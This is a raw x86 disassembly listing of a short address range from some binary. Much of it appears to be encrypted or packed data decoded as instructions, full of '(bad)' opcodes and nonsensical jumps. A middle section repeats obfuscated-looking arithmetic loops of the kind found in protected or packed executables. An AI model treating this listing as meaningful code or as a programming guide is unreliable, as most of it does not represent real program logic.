  4143e3:	das    
  4143e4:	jge    0x414375
  4143e6:	lock movd mm4,eax
  4143ea:	or     bh,al
  4143ec:	or     BYTE PTR [ebx+0x31162e21],0x2e
  4143f3:	js     0x414436
  4143f5:	xchg   esi,eax
  4143f6:	mov    ds:0x7df798c1,al
  4143fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143fc:	pop    ss
  4143fd:	fidiv  DWORD PTR [eax+0x48f8508b]
  414403:	jae    0x414434
  414405:	imul   ecx,DWORD PTR [eax+0x2d6e9c74],0x32
  41440c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41440d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41440e:	adc    DWORD PTR [esi+0x11d88856],ecx
  414414:	jno    0x4143d2
  414416:	jmp    0x4143c5
  414418:	sbb    ecx,DWORD PTR [ebx+0x4042d070]
  41441e:	test   DWORD PTR [edi+0x20cca44a],edi
  414424:	xlat   BYTE PTR ds:[ebx]
  414425:	pusha  
  414426:	push   ebp
  414427:	jno    0x4143e9
  414429:	mov    dl,0x6e
  41442b:	dec    ebx
  41442c:	pushf  
  41442d:	push   ebx
  41442e:	daa    
  41442f:	sbb    DWORD PTR [edx],edx
  414431:	push   ecx
  414432:	fist   DWORD PTR [eax-0x1]
  414435:	mul    BYTE PTR [esi+0x2a4b2b5c]
  41443b:	into   
  41443c:	mov    DWORD PTR [esi-0x4d4536a3],esp
  414442:	(bad)  [ebx+edx*4]
  414445:	int3   
  414446:	ror    BYTE PTR ds:0xbb3ee5a4,0x4e
  41444d:	popa   
  41444e:	stos   DWORD PTR es:[edi],eax
  41444f:	adc    eax,0x812c8f76
  414454:	mov    ds:0x5ba26a44,eax
  414459:	mov    ch,0x7f
  41445b:	dec    edx
  41445c:	adc    BYTE PTR ds:0x201e2a2d,cl
  414462:	mov    bl,BYTE PTR [eax+0x3f]
  414465:	mov    edx,0xf79036b4
  41446a:	dec    ecx
  41446b:	icebp  
  41446c:	inc    ebp
  41446d:	sub    al,0x81
  41446f:	mov    DWORD PTR [ebp+0x84d90f1],edi
  414475:	in     eax,dx
  414476:	test   eax,0x8683b974
  41447b:	add    al,0x4f
  41447d:	lods   eax,DWORD PTR ds:[esi]
  41447e:	je     0x4144bc
  414480:	mov    edi,esp
  414482:	int    0xd1
  414484:	sbb    DWORD PTR [esi-0x4a],ecx
  414487:	cmp    DWORD PTR [edi+0x15],0xffca39de
  41448e:	mov    ecx,DWORD PTR [esi-0x60]
  414491:	mov    eax,ds:0xc6d3aeae
  414496:	sub    BYTE PTR [eax],0xaf
  414499:	cmp    al,0x72
  41449b:	pop    esi
  41449c:	scas   al,BYTE PTR es:[edi]
  41449d:	outs   dx,BYTE PTR ds:[esi]
  41449e:	sub    dh,BYTE PTR [eax+0x2c682bd9]
  4144a4:	pop    esi
  4144a5:	xor    al,0x3
  4144a7:	cwde   
  4144a8:	sub    DWORD PTR [esi-0x48236496],ebx
  4144ae:	push   0xf14f16fd
  4144b3:	and    DWORD PTR [edx-0x4f],esp
  4144b6:	clc    
  4144b7:	loop   0x41445b
  4144b9:	dec    edx
  4144ba:	aam    0xf8
  4144bc:	js     0x4144b0
  4144be:	mov    BYTE PTR [ebx],ch
  4144c0:	cs pop es
  4144c2:	mov    ds,WORD PTR [eax]
  4144c4:	imul   ecx,DWORD PTR [eax-0x6487272],0x9c866376
  4144ce:	inc    DWORD PTR [edx]
  4144d0:	cld    
  4144d1:	add    DWORD PTR ds:[edi-0xc302c6],edx
  4144d8:	fidiv  DWORD PTR [edx]
  4144da:	sub    DWORD PTR [ecx+0x558519c4],0x5fa6de55
  4144e4:	imul   ebp,DWORD PTR [eax-0x6504bcd3],0x6b
  4144eb:	sbb    ebp,DWORD PTR [edx-0x221ad179]
  4144f1:	dec    ebx
  4144f2:	leave  
  4144f3:	dec    ebp
  4144f4:	scas   eax,DWORD PTR es:[edi]
  4144f5:	test   eax,0xe403e948
  4144fa:	int    0xf0
  4144fc:	cwde   
  4144fd:	xor    al,0x64
  4144ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414500:	or     DWORD PTR [ebx+ebx*8-0x3d],ecx
  414504:	cmp    ah,bh
  414506:	in     eax,dx
  414507:	fld    st(0)
  414509:	loopne 0x414546
  41450b:	fldenv [ebx]
  41450d:	sysenter 
  41450f:	cld    
  414510:	call   0xaf60:0xb3c9ea64
  414517:	popa   
  414518:	and    eax,DWORD PTR [ecx]
  41451a:	sbb    ebx,DWORD PTR [eax]
  41451c:	xchg   BYTE PTR [ecx+0x23],dl
  41451f:	xchg   esi,eax
  414520:	jmp    0xfe33:0x56d6136d
  414527:	mov    ah,0xcd
  414529:	sub    eax,0xcf72ba7d
  41452e:	fcmovbe st,st(1)
  414530:	pop    esi
  414531:	int3   
  414532:	jne    0x414596
  414534:	add    BYTE PTR [bp+si-0x40d6],0x34
  41453a:	(bad)  
  41453b:	jmp    0x7c3a:0x3d222dda
  414542:	imul   eax,ebp,0x88103488
  414548:	or     ecx,DWORD PTR [edx]
  41454a:	fist   DWORD PTR [eax-0x5b]
  41454d:	mov    ebp,0x943f84eb
  414552:	sbb    BYTE PTR [ecx+0x75],al
  414555:	jl     0x414510
  414557:	sbb    eax,0x345ff0fc
  41455c:	push   eax
  41455d:	push   esp
  41455e:	pop    esi
  41455f:	add    al,0xca
  414561:	jbe    0x4145de
  414563:	mov    cl,0xdf
  414565:	push   0x17
  414567:	adc    DWORD PTR [edi+0x26],ecx
  41456a:	xchg   esi,eax
  41456b:	loopne 0x414527
  41456d:	sti    
  41456e:	xchg   ebx,eax
  41456f:	sub    al,0x4f
  414571:	adc    eax,0xed65dc46
  414576:	stos   BYTE PTR es:[edi],al
  414577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414578:	cmp    esi,edx
  41457a:	test   al,0x6a
  41457c:	popf   
  41457d:	jns    0x414565
  41457f:	stc    
  414580:	xor    ch,ah
  414582:	ins    BYTE PTR es:[edi],dx
  414583:	sbb    esp,DWORD PTR [eax+0x70]
  414586:	scas   eax,DWORD PTR es:[edi]
  414587:	and    esi,ebx
  414589:	or     DWORD PTR [eax],ecx
  41458b:	and    DWORD PTR [esi],0x47
  41458e:	pop    es
  41458f:	jae    0x41457d
  414591:	dec    edi
  414592:	sti    
  414593:	add    dh,BYTE PTR [esp+eiz*2+0x27ea0982]
  41459a:	mov    ds:0xf043b0d2,al
  41459f:	pop    ebp
  4145a0:	push   esi
  4145a1:	loop   0x4145f0
  4145a3:	adc    DWORD PTR [esi+eax*8],esi
  4145a6:	jmp    0x948ff8a9
  4145ab:	sub    edi,esp
  4145ad:	inc    ebx
  4145ae:	das    
  4145af:	sub    DWORD PTR [esi+0x78d71131],0x7b
  4145b6:	pop    ecx
  4145b7:	pop    ebp
  4145b8:	test   DWORD PTR [ebx],eax
  4145ba:	(bad)  
  4145bb:	lods   eax,DWORD PTR ds:[esi]
  4145bc:	out    0xb2,al
  4145be:	pop    ebx
  4145bf:	xchg   ebp,eax
  4145c0:	cld    
  4145c1:	lods   al,BYTE PTR ds:[esi]
  4145c2:	jl     0x414609
  4145c4:	cmp    eax,DWORD PTR [ecx]
  4145c6:	das    
  4145c7:	mov    DWORD PTR [ecx+eiz*8+0x67],ebp
  4145cb:	data16 add BYTE PTR [ebp+0x66b19bc0],ch
  4145d2:	(bad)  
  4145d3:	fiadd  WORD PTR [edi-0x15c19aa4]
  4145d9:	jnp    0x41456a
  4145db:	push   edi
  4145dc:	jae    0x41456c
  4145de:	lahf   
  4145df:	mov    esp,0xb95b581c
  4145e4:	(bad)  [edi-0x3f]
  4145e7:	cli    
  4145e8:	push   0xb7d3b28d
  4145ed:	fadd   QWORD PTR [esi+0x2c]
  4145f0:	add    eax,0x925f7ce6
  4145f5:	mov    WORD PTR [eax+0x75],?
  4145f8:	fs cs ret 0x3495
  4145fd:	je     0x4145a8
  4145ff:	sbb    cl,al
  414601:	add    al,0xf0
  414603:	stc    
  414604:	jl     0x4145f0
  414606:	call   0x1772a4d3
  41460b:	jmp    0x40ae144a
  414610:	cmp    edi,DWORD PTR [edi-0x23b86563]
  414616:	lock je 0x414688
  414619:	dec    BYTE PTR [edx+ebx*4-0x3f]
  41461d:	jge    0x414675
  41461f:	sbb    edi,edi
  414621:	mov    bh,0xc0
  414623:	and    al,0xf6
  414625:	pop    esi
  414626:	jmp    0x2fb5544a
  41462b:	mov    dh,0x2c
  41462d:	retf   0x2a9
  414630:	jnp    0x4145ec
  414632:	jae    0x4145ff
  414634:	pop    esp
  414635:	pop    es
  414636:	jbe    0x414634
  414638:	jo     0x4146a5
  41463a:	idiv   esp
  41463c:	xor    ebp,esi
  41463e:	popa   
  41463f:	stos   BYTE PTR es:[edi],al
  414640:	add    cl,BYTE PTR [edx]
  414642:	push   es
  414643:	in     al,0x39
  414645:	(bad)  
  414646:	fmul   st(4),st
  414648:	xor    edx,esp
  41464a:	mov    ecx,0xe15afbce
  41464f:	xchg   esi,eax
  414650:	mov    ch,0x7c
  414652:	test   al,0xd3
  414654:	dec    ebp
  414655:	(bad)  
  414656:	jl     0x4146ac
  414658:	adc    edx,DWORD PTR [ebx+0xb]
  41465b:	outs   dx,DWORD PTR ds:[esi]
  41465c:	aam    0xd3
  41465e:	xor    BYTE PTR [ecx-0x46584178],dh
  414664:	les    esp,FWORD PTR [ebp-0x56914b96]
  41466a:	scas   eax,DWORD PTR es:[edi]
  41466b:	sub    BYTE PTR [ebx+0x0],dh
  41466e:	(bad)  
  41466f:	cld    
  414670:	adc    ah,0xd6
  414673:	cwde   
  414674:	out    dx,al
  414675:	or     esi,DWORD PTR [eax+0x8df5bfe]
  41467b:	mov    BYTE PTR [eax+0x5b040668],ah
  414681:	fmul   DWORD PTR [ebx]
  414683:	enter  0xb18,0x3e
  414687:	arpl   WORD PTR [edi],cx
  414689:	dec    esp
  41468a:	call   0x765b:0x37864722
  414691:	push   0x154bcc8c
  414696:	pop    ds
  414697:	nop
  414698:	or     eax,DWORD PTR [eax]
  41469a:	pop    ebp
  41469b:	sahf   
  41469c:	call   0x2951:0x11e5be8c
  4146a3:	adc    al,0xa4
  4146a5:	in     eax,0xb6
  4146a7:	and    DWORD PTR [ecx-0xafb0b1f],esi
  4146ad:	push   ebp
  4146ae:	inc    ebp
  4146af:	fcmovu st,st(6)
  4146b1:	out    0x57,al
  4146b3:	mov    ebx,0xf084a4b0
  4146b9:	jl     0x4146b0
  4146bb:	into   
  4146bc:	jnp    0x41472a
  4146be:	ja     0x4146c9
  4146c0:	pop    eax
  4146c1:	arpl   WORD PTR [edx+0x7e],dx
  4146c4:	out    0xf2,eax
  4146c6:	scas   al,BYTE PTR es:[edi]
  4146c7:	lds    ebp,FWORD PTR [eax]
  4146c9:	js     0x414671
  4146cb:	aam    0xf7
  4146cd:	out    dx,eax
  4146ce:	adc    al,0x69
  4146d0:	in     al,dx
  4146d1:	pop    ebx
  4146d2:	js     0x41466b
  4146d4:	adc    eax,0xcc3eea67
  4146d9:	or     dh,BYTE PTR [esi]
  4146db:	ror    DWORD PTR [eax],cl
  4146dd:	or     al,0x40
  4146df:	call   0xc7a71ad4
  4146e4:	jnp    0x41471d
  4146e6:	mov    ?,WORD PTR [ecx+0x72]
  4146e9:	jl     0x4146a1
  4146eb:	inc    edx
  4146ec:	push   eax
  4146ed:	retf   
  4146ee:	mov    bh,0x52
  4146f0:	mov    BYTE PTR ds:0xf76291c0,dh
  4146f6:	xor    al,0x4d
  4146f8:	test   eax,0x95f3edde
  4146fd:	dec    edx
  4146fe:	jge    0x414724
  414700:	jmp    0xa8db7023
  414705:	bound  edx,QWORD PTR [ecx+0x22]
  414708:	retf   0xad57
  41470b:	add    eax,0x69d27b7e
  414710:	mov    ebx,0x40ae1963
  414715:	fsub   DWORD PTR [edx+0x72]
  414718:	cmp    DWORD PTR [eax+eiz*2],esp
  41471b:	dec    edx
  41471c:	cmp    ebp,DWORD PTR [ebp-0x7a27b7d7]
  414722:	fisttp QWORD PTR [ecx+0x6e]
  414725:	push   ebx
  414726:	add    edx,esi
  414728:	push   ss
  414729:	stos   BYTE PTR es:[edi],al
  41472a:	xchg   ecx,eax
  41472b:	pop    esi
  41472c:	push   eax
  41472d:	test   BYTE PTR [eax],0x98
  414730:	adc    eax,0xaed5c5ca
  414735:	scas   eax,DWORD PTR es:[edi]
  414736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414737:	and    ecx,ecx
  414739:	cdq    
  41473a:	sti    
  41473b:	adc    eax,0x5394c13b
  414740:	aas    
  414741:	dec    eax
  414742:	sti    
  414743:	xor    al,0x67
  414745:	clc    
  414746:	cli    
  414747:	jae    0x4147a9
  414749:	mov    al,0xdc
  41474b:	push   esp
  41474c:	sub    BYTE PTR [ebx-0x9ee9c33],ah
  414752:	js     0x41479a
  414754:	lea    edi,[esi]
  414756:	sbb    al,0xd7
  414758:	mov    ecx,0x5761d41e
  41475d:	loop   0x4147b2
  41475f:	sub    DWORD PTR [edx],0x69459149
  414765:	ds test al,0x7d
  414768:	test   BYTE PTR ds:0x623ad8c5,cl
  41476e:	sub    ebp,DWORD PTR [ebx+0x603fa535]
  414774:	jle    0x4147f3
  414776:	pop    ds
  414777:	and    al,0x5a
  414779:	mov    ds:0xea6ba077,al
  41477e:	aas    
  41477f:	lea    ecx,[esi-0x3c4d8550]
  414785:	dec    edx
  414786:	repz imul eax,edx,0x13333eb2
  41478d:	mov    ebx,0xd5baed7c
  414792:	popf   
  414793:	mov    eax,ds:0x9c296cfc
  414798:	lahf   
  414799:	pop    esi
  41479a:	inc    edx
  41479b:	inc    ecx
  41479c:	das    
  41479d:	sahf   
  41479e:	sub    al,0x8e
  4147a0:	push   ecx
  4147a1:	adc    eax,0xe1a2d182
  4147a6:	scas   eax,DWORD PTR es:[edi]
  4147a7:	pusha  
  4147a8:	mov    ah,0x7c
  4147aa:	stc    
  4147ab:	mov    esp,0xec264b19
  4147b0:	mov    ecx,0x57ba5588
  4147b5:	fnstsw WORD PTR [esi-0x54]
  4147b8:	xchg   ebx,eax
  4147b9:	or     esi,DWORD PTR [ecx]
  4147bb:	pop    ecx
  4147bc:	adc    esp,ebx
  4147be:	sbb    esi,esi
  4147c0:	sahf   
  4147c1:	dec    esi
  4147c2:	daa    
  4147c3:	ror    BYTE PTR [ebx],0x91
  4147c6:	loop   0x41476d
  4147c8:	ins    DWORD PTR es:[edi],dx
  4147c9:	pop    eax
  4147ca:	xor    BYTE PTR [bx+di+0x7558],bh
  4147cf:	fild   WORD PTR [edi+ebp*4-0x2d]
  4147d3:	pop    esp
  4147d4:	(bad)
  4147d7:	xor    BYTE PTR [ecx],al
  4147d9:	dec    ebx
  4147da:	call   0xa72e:0x5c9a477
  4147e1:	ss push ss
  4147e3:	ins    DWORD PTR es:[edi],dx
  4147e4:	push   ss
  4147e5:	ins    BYTE PTR es:[edi],dx
  4147e6:	int3   
  4147e7:	jmp    DWORD PTR [ebp-0x70a05fa0]
  4147ed:	mov    bh,0xbc
  4147ef:	rcl    BYTE PTR [ebp-0x41ff747a],1
  4147f5:	xchg   esp,eax
  4147f6:	pop    esi
  4147f7:	dec    esi
  4147f8:	imul   eax,DWORD PTR [ebp-0x23],0xd434135c
  4147ff:	inc    ebx
  414800:	icebp  
  414801:	cdq    
  414802:	(bad)  
  414803:	cwde   
  414804:	(bad)  
  414805:	hlt    
  414806:	repnz nop
  414808:	sbb    bh,BYTE PTR [ecx-0x5a3d130f]
  41480e:	fdiv   DWORD PTR [ebx+ebx*2+0x6c44555]
  414815:	dec    esp
  414816:	mov    dh,0xf4
  414818:	stc    
  414819:	fmulp  st(3),st
  41481b:	pop    ss
  41481c:	sbb    BYTE PTR [ecx+0x2f],al
  41481f:	xor    al,0x5
  414821:	jmp    0x5c2e0d10
  414826:	add    ah,BYTE PTR [ecx-0x41]
  414829:	test   al,0xdd
  41482b:	xor    DWORD PTR [ecx],edi
  41482d:	push   es
  41482e:	mov    dl,0xb4
  414830:	fld    TBYTE PTR [edx+0x2c]
  414833:	xchg   edi,eax
  414834:	es jecxz 0x41481a
  414837:	(bad)  
  414838:	mov    al,0x8d
  41483b:	cdq    
  41483c:	rol    DWORD PTR [edi+edi*2-0x3446ea29],1
  414843:	mov    al,ds:0xd1f9c81f
  414848:	jne    0x414836
  41484a:	jmp    0xe52bdedc
  41484f:	cmc    
  414850:	enter  0x27e5,0x1c
  414854:	xor    ebp,eax
  414856:	aam    0x4
  414858:	cmp    DWORD PTR [ecx+edi*1+0x76],0x3a
  41485d:	jecxz  0x4148b3
  41485f:	sbb    edx,esp
  414861:	cmp    DWORD PTR [ebx+0x6b0a0c15],0x30
  414868:	data16 sub al,0x99
  41486b:	add    al,0x91
  41486d:	mov    cl,0x1c
  41486f:	scas   al,BYTE PTR es:[edi]
  414870:	jb     0x4148d0
  414872:	nop
  414873:	mov    ch,0x9d
  414875:	push   edi
  414876:	ja     0x414865
  414878:	jl     0x414830
  41487a:	(bad)  
  41487b:	sti    
  41487c:	pop    es
  41487d:	add    eax,0xba6b5f71
  414882:	mov    al,ds:0x1e86a830
  414887:	xchg   BYTE PTR [esi],dh
  414889:	mov    BYTE PTR [esi+0x42],cl
  41488c:	xlat   BYTE PTR ds:[ebx]
  41488d:	xchg   ebp,eax
  41488e:	int    0xf7
  414890:	in     al,0x98
  414892:	aaa    
  414893:	mov    esp,0x615454de
  414898:	popa   
  414899:	js     0x414902
  41489b:	or     BYTE PTR [ebp+0x470493b6],al
  4148a1:	fwait
  4148a2:	mov    al,0x2e
  4148a4:	or     BYTE PTR [esi+0x5d],0x88
  4148a8:	pushf  
  4148a9:	enter  0x41a8,0x4e
  4148ad:	repz rcr BYTE PTR [edx+edi*1-0x4c],1
  4148b2:	xchg   esp,eax
  4148b3:	jae    0x414873
  4148b5:	sub    eax,0x45800984
  4148ba:	stc    
  4148bb:	ret    
  4148bc:	mov    al,ds:0x2365eab1
  4148c1:	loopne 0x414922
  4148c3:	push   ebx
  4148c4:	dec    esp
  4148c5:	xchg   esi,edi
  4148c7:	stos   DWORD PTR es:[edi],eax
  4148c8:	dec    esp
  4148c9:	into   
  4148ca:	cmp    eax,0x7b8f5a03
  4148cf:	nop
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d2:	jg     0x4148ea
  4148d4:	xchg   DWORD PTR [esp+ebx*2],edx
  4148d7:	sub    edx,DWORD PTR [esi+0xa32f26d]
  4148dd:	ins    BYTE PTR es:[edi],dx
  4148de:	jno    0x41493d
  4148e0:	mov    cl,0x5b
  4148e2:	(bad)  
  4148e3:	xchg   ebx,eax
  4148e4:	fnsetpm(287 only) 
  4148e6:	jb     0x4148bf
  4148e8:	mov    dh,0xe4
  4148ea:	xor    DWORD PTR [ebp+0x5e],esp
  4148ed:	cmp    bh,dl
  4148ef:	push   ss
  4148f0:	mov    bl,0xfd
  4148f2:	dec    ebp
  4148f3:	stos   DWORD PTR es:[edi],eax
  4148f4:	sbb    BYTE PTR [ebx],0xa
  4148f7:	cmp    eax,0x7f4a2477
  4148fc:	inc    esp
  4148fd:	jp     0x41492d
  4148ff:	test   eax,0xeb52ad60
  414904:	stc    
  414905:	ud2    
  414907:	fcom   QWORD PTR [edi]
  414909:	hlt    
  41490a:	jg     0x4148df
  41490c:	add    al,0x44
  41490e:	xor    al,0xbd
  414910:	cwde   
  414911:	xor    BYTE PTR [edx+0xb82d92b],al
  414917:	dec    edi
  414918:	movq   mm3,mm0
  41491b:	loopne 0x4148e0
  41491d:	sbb    DWORD PTR [esi-0x44],eax
  414920:	adc    al,al
  414922:	cmp    ebx,esp
  414924:	(bad)  
  414925:	mov    edx,esi
  414927:	ffree  st(6)
  414929:	loope  0x4148ad
  41492b:	push   eax
  41492d:	fadd   QWORD PTR [ebp-0x3d024ed7]
  414933:	leave  
  414934:	mov    bl,bl
  414936:	mulps  xmm4,XMMWORD PTR [eax+0x4f7429cb]
  41493d:	enter  0x3f32,0xb6
  414941:	sub    ah,BYTE PTR [edx-0x52]
  414944:	loopne 0x41494f
  414946:	cmp    BYTE PTR [edx+0x6b],0xda
  41494a:	or     esi,DWORD PTR [ebx+0x31]
  41494d:	mov    dh,0xab
  41494f:	xlat   BYTE PTR ds:[ebx]
  414950:	cli    
  414951:	push   sp
  414953:	in     al,0x33
  414955:	or     eax,0x86ca2694
  41495a:	push   ebx
  41495b:	retf   0x6877
  41495e:	fsubrp st(7),st
  414960:	shl    BYTE PTR [ebx+ecx*2],0x7f
  414964:	rcr    DWORD PTR [ecx-0x5db9537a],1
  41496a:	jb     0x41490f
  41496c:	jp     0x4149a2
  41496e:	mov    ds:0x226a18c9,al
  414973:	sti    
  414974:	mov    ch,0xd2
  414976:	ret    0x2f4f
  414979:	adc    eax,0xa927edab
  41497e:	int    0xdc
  414980:	pop    ds
  414981:	push   es
  414982:	cmp    esp,esp
  414984:	dec    edx
  414985:	loope  0x4149fc
  414987:	pop    ss
  414988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414989:	mov    eax,ebp
  41498b:	ret    0x9812
  41498e:	imul   eax,DWORD PTR cs:[ebp-0x8de47bf],0xe0480695
  414999:	out    dx,al
  41499a:	cld    
  41499b:	js     0x4149cc
  41499d:	mov    eax,0xdfa46299
  4149a2:	xchg   edx,eax
  4149a3:	test   BYTE PTR [ebp-0x3],0xe
  4149a7:	jne    0x4149b6
  4149a9:	stos   DWORD PTR es:[edi],eax
  4149aa:	scas   al,BYTE PTR es:[edi]
  4149ab:	pop    es
  4149ac:	mov    ds:0xe9085589,al
  4149b1:	jo     0x4149b3
  4149b3:	add    BYTE PTR [eax],al
  4149b5:	mov    edx,DWORD PTR [ebp+0x8]
  4149b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4149bb:	xor    edx,eax
  4149bd:	xor    ebx,eax
  4149bf:	sub    edx,ebx
  4149c1:	sub    edx,esi
  4149c3:	xor    edx,eax
  4149c5:	mov    DWORD PTR [ebp+0x8],edx
  4149c8:	mov    edx,DWORD PTR [ebp+0x8]
  4149cb:	mov    ebx,DWORD PTR [ebp-0x58]
  4149ce:	add    edx,0x5708e2
  4149d4:	imul   edx,ebx
  4149d7:	mov    DWORD PTR [ebp-0x58],edx
  4149da:	mov    edx,DWORD PTR [ebp+0x8]
  4149dd:	mov    ebx,DWORD PTR [ebp-0x54]
  4149e0:	add    edx,0x64f89c
  4149e6:	or     edx,ebx
  4149e8:	mov    DWORD PTR [ebp-0x54],edx
  4149eb:	mov    edx,DWORD PTR [ebp+0x8]
  4149ee:	mov    ebx,DWORD PTR [ebp-0x50]
  4149f1:	add    edx,ecx
  4149f3:	xor    edx,ebx
  4149f5:	mov    DWORD PTR [ebp-0x50],edx
  4149f8:	mov    edx,DWORD PTR [ebp+0x8]
  4149fb:	mov    ebx,DWORD PTR [ebp-0x4c]
  4149fe:	add    edx,edi
  414a00:	and    edx,ebx
  414a02:	mov    DWORD PTR [ebp-0x4c],edx
  414a05:	mov    edx,DWORD PTR [ebp+0x8]
  414a08:	mov    ebx,DWORD PTR [ebp-0x48]
  414a0b:	lea    edx,[ebx+edx*1+0x241fcdf]
  414a12:	mov    DWORD PTR [ebp-0x48],edx
  414a15:	mov    edx,DWORD PTR [ebp+0x8]
  414a18:	mov    ebx,0xfa5e1528
  414a1d:	sub    ebx,edx
  414a1f:	add    ebx,DWORD PTR [ebp-0x44]
  414a22:	mov    DWORD PTR [ebp-0x44],ebx
  414a25:	mov    edx,DWORD PTR [ebp+0x8]
  414a28:	xor    edx,eax
  414a2a:	add    edx,esi
  414a2c:	jne    0x4149b5
  414a32:	mov    edx,DWORD PTR [ebp-0x14]
  414a35:	mov    DWORD PTR [ebp+0x8],edx
  414a38:	jmp    0x414aad
  414a3d:	mov    edx,DWORD PTR [ebp+0x8]
  414a40:	mov    ebx,DWORD PTR [ebp-0x8]
  414a43:	xor    edx,eax
  414a45:	xor    ebx,eax
  414a47:	sub    edx,ebx
  414a49:	sub    edx,esi
  414a4b:	xor    edx,eax
  414a4d:	mov    DWORD PTR [ebp+0x8],edx
  414a50:	mov    edx,DWORD PTR [ebp+0x8]
  414a53:	mov    ebx,DWORD PTR [ebp-0x58]
  414a56:	add    edx,0x5708e2
  414a5c:	imul   edx,ebx
  414a5f:	mov    DWORD PTR [ebp-0x58],edx
  414a62:	mov    edx,DWORD PTR [ebp+0x8]
  414a65:	mov    ebx,DWORD PTR [ebp-0x54]
  414a68:	add    edx,0x64f89c
  414a6e:	or     edx,ebx
  414a70:	mov    DWORD PTR [ebp-0x54],edx
  414a73:	mov    edx,DWORD PTR [ebp+0x8]
  414a76:	mov    ebx,DWORD PTR [ebp-0x50]
  414a79:	add    edx,ecx
  414a7b:	xor    edx,ebx
  414a7d:	mov    DWORD PTR [ebp-0x50],edx
  414a80:	mov    edx,DWORD PTR [ebp+0x8]
  414a83:	mov    ebx,DWORD PTR [ebp-0x4c]
  414a86:	add    edx,edi
  414a88:	and    edx,ebx
  414a8a:	mov    DWORD PTR [ebp-0x4c],edx
  414a8d:	mov    edx,DWORD PTR [ebp+0x8]
  414a90:	mov    ebx,DWORD PTR [ebp-0x48]
  414a93:	lea    edx,[ebx+edx*1+0x241fcdf]
  414a9a:	mov    DWORD PTR [ebp-0x48],edx
  414a9d:	mov    edx,DWORD PTR [ebp+0x8]
  414aa0:	mov    ebx,0xfa5e1528
  414aa5:	sub    ebx,edx
  414aa7:	add    ebx,DWORD PTR [ebp-0x44]
  414aaa:	mov    DWORD PTR [ebp-0x44],ebx
  414aad:	mov    edx,DWORD PTR [ebp+0x8]
  414ab0:	xor    edx,eax
  414ab2:	add    edx,esi
  414ab4:	jne    0x414a3d
  414aba:	mov    edx,DWORD PTR [ebp-0x8]
  414abd:	mov    ebx,DWORD PTR [ebp-0xc]
  414ac0:	xor    edx,eax
  414ac2:	lea    edx,[edx+ebx*1+0x3272f3]
  414ac9:	mov    DWORD PTR [ebp-0xc],edx
  414acc:	mov    edx,DWORD PTR [ebp-0x10]
  414acf:	xor    edx,eax
  414ad1:	add    edx,esi
  414ad3:	jne    0x41224b
  414ad9:	jmp    0x41b68b
  414ade:	mov    ecx,DWORD PTR [ebp-0x14]
  414ae1:	mov    DWORD PTR [ebp+0x8],ecx
  414ae4:	jmp    0x414b5d
  414ae9:	mov    ecx,DWORD PTR [ebp+0x8]
  414aec:	mov    edx,DWORD PTR [ebp-0x8]
  414aef:	xor    ecx,eax
  414af1:	xor    edx,eax
  414af3:	sub    ecx,edx
  414af5:	sub    ecx,esi
  414af7:	xor    ecx,eax
  414af9:	mov    DWORD PTR [ebp+0x8],ecx
  414afc:	mov    ecx,DWORD PTR [ebp+0x8]
  414aff:	mov    edx,DWORD PTR [ebp-0x58]
  414b02:	add    ecx,0x5708e2
  414b08:	imul   ecx,edx
  414b0b:	mov    DWORD PTR [ebp-0x58],ecx
  414b0e:	mov    ecx,DWORD PTR [ebp+0x8]
  414b11:	mov    edx,DWORD PTR [ebp-0x54]
  414b14:	add    ecx,0x64f89c
  414b1a:	or     ecx,edx
  414b1c:	mov    DWORD PTR [ebp-0x54],ecx
  414b1f:	mov    ecx,DWORD PTR [ebp+0x8]
  414b22:	mov    edx,DWORD PTR [ebp-0x50]
  414b25:	add    ecx,0x242ebcd
  414b2b:	xor    ecx,edx
  414b2d:	mov    DWORD PTR [ebp-0x50],ecx
  414b30:	mov    ecx,DWORD PTR [ebp+0x8]
  414b33:	mov    edx,DWORD PTR [ebp-0x4c]
  414b36:	add    ecx,edi
  414b38:	and    ecx,edx
  414b3a:	mov    DWORD PTR [ebp-0x4c],ecx
  414b3d:	mov    ecx,DWORD PTR [ebp+0x8]
  414b40:	mov    edx,DWORD PTR [ebp-0x48]
  414b43:	lea    ecx,[edx+ecx*1+0x241fcdf]
  414b4a:	mov    DWORD PTR [ebp-0x48],ecx
  414b4d:	mov    ecx,DWORD PTR [ebp+0x8]
  414b50:	mov    edx,0xfa5e1528
  414b55:	sub    edx,ecx
  414b57:	add    edx,DWORD PTR [ebp-0x44]
  414b5a:	mov    DWORD PTR [ebp-0x44],edx
  414b5d:	mov    ecx,DWORD PTR [ebp+0x8]
  414b60:	xor    ecx,eax
  414b62:	add    ecx,esi
  414b64:	jne    0x414ae9
  414b6a:	jmp    0x41b697
  414b6f:	mov    ecx,DWORD PTR [ebp+0x8]
  414b72:	mov    edx,DWORD PTR [ebp-0x8]
  414b75:	xor    ecx,eax
  414b77:	jmp    0x416f00
  414b7c:	repnz mov esi,esp
  414b7f:	repz add BYTE PTR [esi+eiz*8-0x19361778],0xd3
  414b88:	rcr    ebx,1
  414b8a:	add    esi,DWORD PTR [edi-0x1]
  414b8d:	add    BYTE PTR [bp+di+0x5c17],0x83
  414b93:	add    DWORD PTR [ebp-0x5c1d1bdc],0x41
  414b9a:	fnstsw WORD PTR [esi-0x220f788c]
  414ba0:	lods   eax,DWORD PTR ds:[esi]
  414ba1:	lea    esp,gs:[ebp+ebp*4+0x774e01de]
  414ba9:	adc    eax,0xbb8d0175
  414bae:	(bad)  
  414baf:	scas   al,BYTE PTR es:[edi]
  414bb0:	mov    ecx,0x57c58dae
  414bb5:	test   al,0xb5
  414bb7:	adc    al,0x55
  414bb9:	clc    
  414bba:	cmc    
  414bbb:	(bad)  
  414bbc:	in     al,0x9e
  414bbe:	xchg   ecx,eax
  414bbf:	clc    
  414bc0:	fsubr  QWORD PTR [ebp+edx*8+0x9]
  414bc4:	adc    al,0x54
  414bc6:	push   ds
  414bc7:	push   ds
  414bc8:	es mov esi,0xff91f147
  414bce:	xor    ecx,esp
  414bd0:	das    
  414bd1:	(bad)  
